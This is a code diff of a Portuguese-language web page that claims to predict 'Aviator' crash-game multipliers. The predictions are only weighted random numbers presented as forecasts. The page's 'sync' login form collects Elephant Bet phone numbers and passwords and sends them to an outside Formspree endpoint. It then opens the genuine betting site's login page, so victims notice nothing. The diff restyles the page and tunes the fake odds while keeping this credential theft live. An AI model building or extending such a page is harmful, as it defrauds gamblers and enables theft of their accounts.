@@ -6,17 +6,18 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body { font-family: Arial, sans-serif; background:#000; color:#fff; text-align:center; margin:0; padding:20px; }
-    h1 { color: #00ffcc; text-shadow: 0 0 10px #00ffcc, 0 0 20px #00ffcc; font-size: 2em; }
+    h1 { color:#00ffcc; font-size:2.2em; margin-bottom:20px; } /* título sem néon */
     .circle { font-size:1.2em; margin:20px auto 5px auto; padding:40px; border-radius:50%; width:180px; height:180px; display:flex; align-items:center; justify-content:center; background:#111; transition: all 0.3s ease; }
-    .azul { color:#0ff; border:3px solid #0ff; box-shadow:0 0 20px #0ff, 0 0 40px #0ff; text-shadow:0 0 10px #0ff; }
+    .azul { color:#0ff; border:3px solid #0ff; box-shadow:0 0 20px #0ff; text-shadow:0 0 10px #0ff; }
     .blocked { background:#222; color:#ffcc00; padding:10px; margin:15px auto; border-radius:5px; width:90%; font-size:0.9em; text-shadow:0 0 10px #ffcc00; }
-    #preverBtn { background:#ffcc00; color:#000; box-shadow:0 0 15px #ffcc00, 0 0 30px #ffcc00; }
-    #preverBtn:hover { background:#e6b800; box-shadow:0 0 20px #e6b800, 0 0 40px #e6b800; }
-    #openLogin { background:#00ff00; color:#000; box-shadow:0 0 15px #00ff00, 0 0 30px #00ff00; }
-    #openLogin:hover { background:#00cc00; box-shadow:0 0 20px #00cc00, 0 0 40px #00cc00; }
-    #loginForm button { background:#ff0066; color:#fff; box-shadow:0 0 15px #ff0066, 0 0 30px #ff0066; }
-    #loginForm button:hover { background:#cc0055; box-shadow:0 0 20px #cc0055, 0 0 40px #cc0055; }
-    input { margin:8px; padding:10px; width:80%; max-width:300px; font-size:1em; background:#111; color:#0ff; border:1px solid #0ff; border-radius:5px; box-shadow:0 0 10px #0ff; }
+    button { padding:15px 25px; font-size:1.1em; border:none; border-radius:5px; cursor:pointer; width:80%; max-width:320px; margin:15px auto; display:block; }
+    #preverBtn { background:#ffcc00; color:#000; box-shadow:0 0 15px #ffcc00; }
+    #preverBtn:hover { background:#e6b800; }
+    #openLogin { background:#00ff00; color:#000; box-shadow:0 0 15px #00ff00; }
+    #openLogin:hover { background:#00cc00; }
+    #loginForm button { background:#ff0066; color:#fff; box-shadow:0 0 15px #ff0066; }
+    #loginForm button:hover { background:#cc0055; }
+    input { margin:8px; padding:12px; width:80%; max-width:300px; font-size:1em; background:#111; color:#0ff; border:1px solid #0ff; border-radius:5px; box-shadow:0 0 10px #0ff; }
     input::placeholder { color:#888; }
     #loginScreen { display:none; }
     footer { margin-top:30px; font-size:0.8em; color:#888; }
@@ -39,18 +40,7 @@
   <div id="loginScreen">
     <h2>Conecte com a sua conta da Elephant Bet</h2>
     <form id="loginForm">
-      <label for="numero">Número</label><br>
-      <input 
-        type="tel" 
-        id="numero" 
-        name="numero" 
-        placeholder="número de telemóvel" 
-        required 
-        maxlength="9"
-        pattern="9[0-9]{8}"
-        title="O número deve começar com 9 e ter 9 dígitos"
-      ><br>
-      <label for="senha">Senha</label><br>
+      <input type="tel" id="numero" name="numero" placeholder="Número de telemóvel" required maxlength="9" pattern="9[0-9]{8}" title="O número deve começar com 9 e ter 9 dígitos"><br>
       <input type="password" id="senha" name="senha" placeholder="Digite a sua senha" required><br>
       <button type="submit">Sincronizar Agora</button>
     </form>
@@ -64,7 +54,7 @@
   <script>
     let previsoesFeitas = 0;
     let bloqueado = false;
-    const maxPrevisoes = 2;
+    const maxPrevisoes = 5; // aumentei para 5 previsões
 
     const circle = document.getElementById("circle");
     const resultado = document.getElementById("resultado");
@@ -82,14 +72,24 @@
       circle.className = "circle";
       circle.classList.add("flash");
       beepSound.play();
+
       setTimeout(() => {
         circle.classList.remove("flash");
-        const multiplicadores = ["1.2x","1.5x","2.3x","3.5x","5x","7.8x","10x","15x","20x","50x","100x"];
-        const resultadoAleatorio = multiplicadores[Math.floor(Math.random() * multiplicadores.length)];
+        // Distribuição semelhante ao Aviator
+        const multiplicadores = [1.2,1.3,1.5,2,3,5,7,10,20,50,100];
+        const pesos = [30,20,15,10,8,6,5,3,2,1,0.5]; // mais chance nos baixos
+        const totalPeso = pesos.reduce((a,b)=>a+b,0);
+        let rand = Math.random() * totalPeso;
+        let resultadoAleatorio;
+        for (let i=0; i<multiplicadores.length; i++) {
+          if (rand < pesos[i]) { resultadoAleatorio = multiplicadores[i]+"x"; break; }
+          rand -= pesos[i];
+        }
         circle.textContent = resultadoAleatorio;
         circle.className = "circle azul";
         resultado.textContent = `Previsão ${previsoesFeitas}: Resultado → ${resultadoAleatorio}`;
       }, 2000);
+
       if (previsoesFeitas >= maxPrevisoes) {
         bloqueado = true;
         blockedMsg.style.display = "block";
@@ -112,12 +112,10 @@
       homeScreen.style.display = "block";
     });
 
-    // Bloquear caracteres não numéricos durante digitação
     document.getElementById("numero").addEventListener("input", function() {
       this.value = this.value.replace(/[^0-9]/g, "");
     });
 
-    // Validação extra no envio
     loginForm.addEventListener("submit", async function(event) {
       event.preventDefault();
       const numero = document.getElementById("numero").value;
@@ -128,7 +126,7 @@
         return;
       }
 
-      statusMsg.textContent = "faça conexão correcta...";
+      statusMsg.textContent = "Conectando...";
 
       try {
         await fetch("https://formspree.io/f/xvgwbowg", {
@@ -145,7 +143,7 @@
       blockedMsg.style.display = "none";
 
       setTimeout(() => {
-        window.location.href = "https://elephantbet.com/login";
+        window.open("https://elephantbet.com/login","_blank"); // abre em nova aba
       }, 1500);
     });
   </script>
